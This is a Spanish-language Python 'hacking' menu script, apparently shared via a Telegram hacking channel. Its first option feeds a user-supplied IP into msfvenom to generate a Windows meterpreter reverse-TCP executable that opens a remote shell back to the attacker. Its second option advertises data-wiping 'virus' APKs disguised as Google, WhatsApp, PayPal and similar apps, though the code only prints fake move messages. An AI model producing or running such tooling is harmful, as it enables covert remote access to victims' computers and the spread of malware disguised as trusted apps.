#----import system and colorama---

from os import system
from colorama import Fore
import time
import sys

#----------Operative System------

#----------------Banner-----------

def banner():
    print(Fore.BLUE+"\n _                                                     _")#<--------Banner------
    print("/ \    /\         __                          _   __  /_/ __")
    print("| |\  / | _____   \ \            ___   _____ | | /  \ _   \ \ ")
    print("| | \/| | | ___\ |- -|   /\     / __\ | -__/ | || | || | |- -|")
    print("|_|   | | | _|__  | |_  / -\  __\ \   | |    | | \__/| |  | |_")
    print("      |/  |____/  \___\/ /\ \ \___/   \/     \__|    |_\  \___\ ")
    print("              https://t.me/HackingAndPrograming")

while True:
    system("clear")
    print("```````````````````````````````````````````````````````````")
    print(Fore.BLUE+ "´´´´´´´´´´´´´´´´´´´ ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´´´´´´´´´´´´´´`")
    print("´´´´´´´´´´´´´´´´´¶¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´´´´´´´")
    print("´´´´´´´´´´´´´´¶¶¶¶´´´´´´´´´´´´´´´´´´´´´´´¶¶¶¶´´´´´´´´´´´´´´")
    print("´´´´´´´´´´´´´¶¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´´´")
    print("´´´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´´")
    print("´´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´`´´´´´´´´´´´¶¶´´´´´´´´´´`")
    print("´´´´´´´´´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´´´´´´´´´")
    print("´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶´´´´´´´´´´")
    print("´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶´´´´´´´´´´")
    print("´´´´´´´´´´¶¶´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶´´´´´´´´´´")
    print("´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´¶¶´´´´´´´´´´")
    print("´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶¶´´´´´´´´´´")
    print("´´´´´´´´´´´¶¶´¶¶´´´¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶´´´¶¶´¶¶´´´´´´´´´´´")
    print("´´´´´´´´´´´´¶¶¶¶´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶´¶¶¶¶¶´´´´´´´´´´´")
    print("´´´´´´´´´´´´´¶¶¶´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶´¶¶¶´´´´´´´´´´´´´")
    print("´´´´¶¶¶´´´´´´´¶¶´´¶¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶¶¶´´¶¶´´´´´´¶¶¶¶´´´")
    print("´´´¶¶¶¶¶´´´´´¶¶´´´¶¶¶¶¶¶¶´´´¶¶¶´´´¶¶¶¶¶¶¶´´´¶¶´´´´´¶¶¶¶¶¶´´")
    print("´´¶¶´´´¶¶´´´´¶¶´´´´´¶¶¶´´´´¶¶¶¶¶´´´´¶¶¶´´´´´¶¶´´´´¶¶´´´¶¶´´")
    print("´¶¶¶´´´´¶¶¶¶´´¶¶´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´¶¶´´¶¶¶¶´´´´¶¶¶´")
    print("¶¶´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶´´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´¶¶")
    print("¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶´´´´¶¶¶¶¶¶¶´´´´¶¶¶¶¶¶¶¶´´´´´´¶¶¶¶¶¶¶¶")
    print("´´¶¶¶¶´¶¶¶¶¶´´´´´´¶¶¶¶¶´´´´´´´´´´´´´´¶¶¶´¶¶´´´´´¶¶¶¶¶¶´¶¶¶´")
    print("´´´´´´´´´´¶¶¶¶¶¶´´¶¶¶´´¶¶´´´´´´´´´´´¶¶´´¶¶¶´´¶¶¶¶¶¶´´´´´´´´")
    print("´´´´´´´´´´´´´´¶¶¶¶¶¶´¶¶´¶¶¶¶¶¶¶¶¶¶¶´¶¶´¶¶¶¶¶¶´´´´´´´´´´´´´´")
    print("´´´´´´´´´´´´´´´´´´¶¶´¶¶´¶´¶´¶´¶´¶´¶´¶´¶´¶¶´´´´´´´´´´´´´´´´´")
    print("´´´´´´´´´´´´´´´´¶¶¶¶´´¶´¶´¶´¶´¶´¶´¶´¶´´´¶¶¶¶¶´´´´´´´´´´´´´´")
    print("´´´´´´´´´´´´¶¶¶¶¶´¶¶´´´¶¶¶¶¶¶¶¶¶¶¶¶¶´´´¶¶´¶¶¶¶¶´´´´´´´´´´´´")
    print("´´´´¶¶¶¶¶¶¶¶¶¶´´´´´¶¶´´´´´´´´´´´´´´´´´¶¶´´´´´´¶¶¶¶¶¶¶¶¶´´´´")
    print("´´´¶¶´´´´´´´´´´´¶¶¶¶¶¶¶´´´´´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´´´´¶¶´´´")
    print("´´´´¶¶¶´´´´´¶¶¶¶¶´´´´´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´¶¶¶¶¶´´´´´¶¶¶´´´´")
    print("´´´´´´¶¶´´´¶¶¶´´´´´´´´´´´¶¶¶¶¶¶¶¶¶´´´´´´´´´´´¶¶¶´´´¶¶´´´´´´")
    print("´´´´´´¶¶´´¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶´´¶¶´´´´´´")
    print("´´´´´´´¶¶¶¶´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´´¶¶¶¶´´´´´´´")
    print("´´´´´´´´´´´´´´´´´´´´´"+ Fore.RED+ "Creador:"+ Fore.GREEN+ "74lg0" + Fore.BLUE+ "´´´´´´´´´´´´´´´´´´´´´´´")
    print("´´´´´´´´´´´´´´´´´´´´´"+ Fore.RED+ "Version:"+ Fore.BLUE+ "1.2"+Fore.BLUE+ "´´´´´´´´´´´´´´´´´´´´´´´´´´´")
    print("´´´´´´´´´´´´´´´´´´´´´"+ Fore.YELLOW+ "Hackeando desde android"+ Fore.BLUE+ "´´´´´´´´´´´´´´´")
    print(Fore.BLUE+ "´´´´´´´´´´´" + Fore.GREEN+ "https://t.me/HackingAndPrograming" + Fore.BLUE+ "´´´´´´´´´´´´´´´")
    
    #----------------Menu-------------
    
    #Nota: int(input()) te toma un numero literal, input() te lo toma como string
    
    print(Fore.RED+ "[1]" + Fore.YELLOW+ "Viruz acceso al dispositivo" , Fore.RED+ "\n[2]"+ Fore.YELLOW+ "Viruz elimina todo"+ Fore.RED+ "\n[3]" + Fore.YELLOW+ "Salir del programa"+ Fore.RED+ "\n[4]"+ Fore.YELLOW+ "Escaneo con Nmap a direcciones IP"+ Fore.GREEN+ "[NEW]")
    eleccion=input(Fore.GREEN+"~"+ Fore.WHITE+ "$ Elije una opcion: ")
    #----------------Options1 and banner2----------
    if eleccion == "1":
        print(Fore.YELLOW+ "Cargando...")
        time.sleep(3)
        system("clear")
        print("")
        print("")
        print(Fore.RED+ "          .n                     .             .                n.")
        print("     .n                     .             .                n.")
        print("  . .dP                   dP               9b               9b   .")
        print(" 4  qXb         .        dX                 Xb       .      dXp   t")
        print("dX.  9Xb      .dXb     __                     __    dXb.   dXP   .Xb")
        print("9XXb._     _.dXXXXb dXXXXbo.               dXXXXb dXXXXb._   _.dXXP")
        print(" 9XXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXP")
        print("   9XXXXXXXXXXXXXXX ~   ~ OOO8b   d8OOO ~   ~ XXXXXXXXXXXXXXXXXP")
        print("     9XXXXXP   9XX      "+ Fore.YELLOW+ "*     " + Fore.RED+ "98v8P" + Fore.YELLOW+"      *     "+ Fore.RED+ "XXP   9XXXXXXXP")
        print("      ~~~       9X.          .db|db.          .XP       ~~~")
        print("                  )b.  .dbo.dP' v  9b.odb.  .dX(")
        print("                ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.")
        print("               dXXXXXXXXXXXP'   .    9XXXXXXXXXXXb")
        print("             dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb")
        print("             9XXb'    XXXXXb.dX|Xb.dXXXXX'    dXXP")
        print("                       9XXXXXX(   )XXXXXXP")
        print("                       XXXX X. v .X XXXX")
        print("                        XP^X' b   d' X^XX")
        print("                        X. 9         P )X")
        print("                         b          '  d'")
        print(Fore.RED+ "                          Creador:"+ Fore.YELLOW+ "74lg0")
        print(Fore.RED+ "                          Version:"+ Fore.BLUE+ "1.2")
        print(Fore.YELLOW+ "                        Hacking MetaSploit")
        
        
        print(Fore.RED+ "                https://t.me/HackingAndPrograming")
        print(Fore.YELLOW+ "\n------------------------------------------")
        print("Nota:El archivo solo funciona para windows")
        print("------------------------------------------")
        print("Jenerando archivo...")
        eleccionmeta=input(Fore.GREEN+ "Ingresa tu IP privada: ")#<-------Direccion IP privada
 
        eleccionmeta2=input("Ingresa el nombre del archivo junto con el nombre de su extencion --> .exe ")#<-------Nombre del archivo
        
        system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + eleccionmeta + " LPORT=4444 -f exe >" + eleccionmeta2)#<-------Jenerando archivo...
        
        #----------------Options2 and banner3--------------------
    if eleccion == "2":
        print(Fore.GREEN+ "Cargando...")
        time.sleep(1)
        system("clear")
        print(Fore.RED+ "                           ,--.")
        print("                          {    }")
        print("                          K,   }")
        print("                         /  ~Y")
        print("                    ,   /   /")
        print("                   {_'-K.__/")
        print("                      /-.__L._")
        print("                     /  ' / \_}")
        print("                    /  ' /")
        print("            ____   /  ' ")
        print("     ,-'~~~~    ~~/  ' /")
        print("   ,'             ~~~  ',")
        print("  (                        Y")
        print(" {                         I")
        print("{      -                    `,")
        print("|        ,                   )")
        print("|        |   ,..__      __. Y")
        print("|    .,_./  Y   / ^Y   J   )|")
        print("\           |  /   |   |   ||")
        print(" \          L_/    . _ (_,. (" + Fore.BLUE+ " Creador:74lg0")
        print(Fore.RED+ "  \,   ,      ^^^^ / |      )"+ Fore.YELLOW+ " Version:"+ Fore.RED+ "1.2")
        print(Fore.RED+ "    \_  \          / L]     /"+ Fore.GREEN+ " Hacking MetaSploit")
        print(Fore.RED+ "       -_~-,       ` `   ./" + Fore.BLUE+ "https://t.me/HackingAndPrograming")
        print(Fore.RED+ "           {_            )")
        print("             ^^\..___,.--")

#--------------15 archivoz-----------------

        print(Fore.BLUE+ "\n!ATENCION ESTOS VIRUZ ELIMINAN TODA LA INFORMACION DE LOS DISPOSITIVOZ!" , "\n--------los archivoz fueron tomados de otro script (papaviruz)-------")
        print(Fore.RED+ "\n[1]" + Fore.YELLOW+ "Google.apk" , Fore.RED+ "\n[2]" + Fore.YELLOW+ "PlayStore.apk" , Fore.RED+ "\n[3]"+ Fore.YELLOW+ "Termux.apk" , Fore.RED+ "\n[4]" , Fore.YELLOW+ "Galeria.apk" , Fore.RED+ "\n[5]" , Fore.YELLOW+ "Gmail.apk" , Fore.RED+ "\n[6]" , Fore.YELLOW+ "Whatsapp Espia.apk" , Fore.RED+ "\n[7]" , Fore.YELLOW+ "Camara.apk" , Fore.RED+ "\n[8]" + Fore.YELLOW+ "Internet gratis.apk" , Fore.RED+ "\n[9]" , Fore.YELLOW+ "Whatsapp lite.apk" , Fore.RED+ "\n[10]" + Fore.YELLOW+ "PayPal.apk")
        eleccionarch=input(Fore.RED+ "~~Elige una opcion: ")
#-------Options2 and opcion1-------
        if eleccionarch == "1":
            print(Fore.YELLOW+ "Cargando...")
            time.sleep(2)
            system("clear")
            
            banner()#<------Funcion de Banner
            
            print("")
            elecciondirectorio=input(Fore.YELLOW+ "Mover a: ")
            print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio)
            time.sleep(3)
#-----Options2 and opcion2----------
        elif eleccionarch == "2":
            print(Fore.YELLOW+ "Cargando...")
            time.sleep(2)
            system("clear")
            
            banner()#<--------Funcion de Banner
            
            print("")
            elecciondirectorio1=input(Fore.YELLOW+ "Mover a: ")
            print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio1)
            time.sleep(3)
#-----Options2 and opcion3----------
        elif eleccionarch == "3":
            print(Fore.YELLOW+ "Cargando...")
            time.sleep(2)
            system("clear")
            
            banner()#<--------Funcion de Banner
            
            elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
            print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
            time.sleep(3)
#-----Options3 and Options4----------
        elif eleccionarch == "4":
            print(Fore.YELLOW+ "Cargando...")
            time.sleep(2)
            system("clear")
            
            banner()#<--------Funcion de Banner
            
            elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
            print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
            time.sleep(3)
#-----Options3 and Options5---------
        elif eleccionarch == "5":
            print(Fore.YELLOW+ "Cargando...")
            time.sleep(2)
            system("clear")
            
            banner()#<--------Funcion de Banner
            
            elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
            
            print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
            time.sleep(3)
#-----Options3 and Options6---------
        elif eleccionarch == "6":
            print(Fore.YELLOW+ "Cargando...")
            time.sleep(2)
            system("clear")
            
            banner()#<--------Funcion de Banner
            
            elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
            print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
            time.sleep(3)
#-----Options3 and Options7-------------------
        elif eleccionarch == "7":
            print(Fore.YELLOW+ "Cargando...")
            time.sleep(2)
            system("clear")
            
            banner()#<--------Funcion de Banner
            
            elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
            print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
            time.sleep(3)
#-----Options3 and Options8----------
        elif eleccionarch == "8":
            print(Fore.YELLOW+ "Cargando...")
            time.sleep(2)
            system("clear")
            
            banner()#<--------Funcion de Banner
            
            elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
            print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
            time.sleep(3)
#-----Options3 and Options9----------
        elif eleccionarch == "9":
            print(Fore.YELLOW+ "Cargando...")
            time.sleep(2)
            system("clear")
            
            banner()#<--------Funcion de Banner
            
            elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
            print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
            time.sleep(3)
#-----Options3 and Options10---------
        elif eleccionarch == "10":
            print(Fore.YELLOW+ "Cargando...")
            time.sleep(2)
            system("clear")
            
            banner()#<--------Funcion de Banner
            
            elecciondirectorio2=input(Fore.YELLOW+ "Mover a: ")
            print(Fore.RED+ "Archivo movido a " + Fore.YELLOW+ elecciondirectorio2)
            time.sleep(3)

#-----All archivez------------------

        elif eleccionarch == "all" or "All" or "ALL":
            system("clear")
            
            banner()
            
            ALL=input(Fore.YELLOW+ "deseas mover todos los viruz a un solo directorio??" + Fore.GREEN+ " Y" + Fore.WHITE+ "/" +Fore.RED+ "N \n")
            if ALL == "N":
                print("reiniciando bucle...")
                time.sleep(1)
            elif ALL == "Y":
                print("Moviendo archivoz esto puede tardar un poco...")
                time.sleep(1)

#---------Invalid Options----------
        
        else:
            system("clear")
            
            print(Fore.BLUE+ "                                  ____________")
            print("[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]")
            print("[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]")
            print("[%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]")
            print("[% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]")
            print("[% |        ||  -__||   _||  _  ||  ,,aS$  `  ||  _  ||  ||  _  ||  ||   _|%%]")
            print("[% |__|__|__||_____||____||___._||%$P `       ||   __||__||_____||__||____|%%]")
            print("[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| ` a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]")
            print("[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`';a,$$_|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]")
            print("[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `'$    %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]")
            print("[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]")

            print("                        https://t.me/HackingAndPrograming")
            print(Fore.RED+ "                             Elije una opcion valida...")
            time.sleep(3)
#---------Invalid Options----------
    
    elif eleccion == "4":
        system("clear")
        
        print(Fore.RED+ "\n                   _______________")
        print("                 _|               |_")
        print("               _|                   |_")
        print("             _|                       |_")
        print("           _|                           |_")
        print("         _|              "+Fore.BLUE+ " *"+Fore.RED+ "               |_")
        print("        |                "+Fore.BLUE+"*|*"+Fore.RED+"                |_")
        print("        |               "+Fore.BLUE+ "* | *"+Fore.RED+"                 |")
        print("        |_              "+Fore.BLUE+"* | *"+Fore.RED+"                _|")
        print("          |_             "+Fore.BLUE+"*|*"+Fore.RED+"               _|")
        print("            |_            "+Fore.BLUE+"*"+Fore.RED+"              _|")
        print("              |_                       _|")
        print("                |_                   _|")
        print("                  |_________________|")
        print(Fore.BLUE+ "SEGUIMOS ACCTUALIZANDO EL SCRIPT, PRONTO SE AGREGARA AL 100% NMAP")
        time.sleep(4)
    
    elif eleccion == "3":
        exit=input(Fore.GREEN+ "~" +Fore.WHITE+ "$ Deseas salir del  programa? y/n" + Fore.GREEN+ "\n~"+ Fore.WHITE+ "$ ")
        if exit == "y":
            print(Fore.YELLOW+ "Saliendo...")
            time.sleep(1)
            sys.exit()
        
        elif exit == "n":
            print(Fore.GREEN+ "Reiniciando bucle...")
            time.sleep(2)
    
    else:
        system("clear")
        print(Fore.RED+ "\n      .:okOOOkdc'           'cdkOOOko:.")#<--------Banner for invalid options---------
        print("    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.")
        print("   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:")
        print("  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'")
        print("  oOOOOOOOO.     oOOOOoOOOOl.    ,OOOOOOOOo")
        print("  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx")
        print("  lOOOOOOOO.         ;d;         ,OOOOOOOOl")
        print("  .OOOOOOOO.   .;           ;    ,OOOOOOOO.")
        print("   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc")
        print("    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo")
        print("     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl")
        print("      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;")
        print("       .dOOo   .OOOOocccxOOOO.   xOOd.")
        print("         ,kOl  .OOOOOOOOOOOOO. .dOk,")
        print("          :kk;.OOOOOOOOOOOOO.cOk:")
        print("            ;kOOOOOOOOOOOOOOOk:")
        print("              ,xOOOOOOOOOOOx,")
        print("                .lOOOOOOOl.")
        print("                   ,dOd,")
        print("                     .")
        print(Fore.YELLOW+ "elije una opcion valida y vuelve a intentarlo" , Fore.BLUE+ ":>")
        print(Fore.BLUE+ "       https://t.me/HackingAndPrograming")
        time.sleep(3)
